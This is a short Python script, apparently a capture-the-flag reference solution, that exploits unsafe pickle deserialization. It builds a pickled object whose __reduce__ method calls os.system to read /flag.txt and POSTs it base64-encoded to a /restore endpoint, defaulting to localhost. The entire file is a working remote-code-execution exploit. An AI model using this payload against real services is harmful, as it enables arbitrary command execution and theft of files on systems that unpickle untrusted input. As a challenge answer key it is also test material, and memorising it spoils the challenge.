"""Reference exploit — pickle RCE."""
import os, sys, base64, pickle, urllib.request


class P:
    def __reduce__(self):
        return (os.system, ("cat /flag.txt > /tmp/leak; cat /tmp/leak",))


def solve(target: str = "http://127.0.0.1:8000/restore") -> str:
    payload = base64.b64encode(pickle.dumps(P()))
    req = urllib.request.Request(target, data=payload, method="POST")
    with urllib.request.urlopen(req, timeout=5) as r:
        return r.read().decode()


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000/restore"
    print(solve(target))
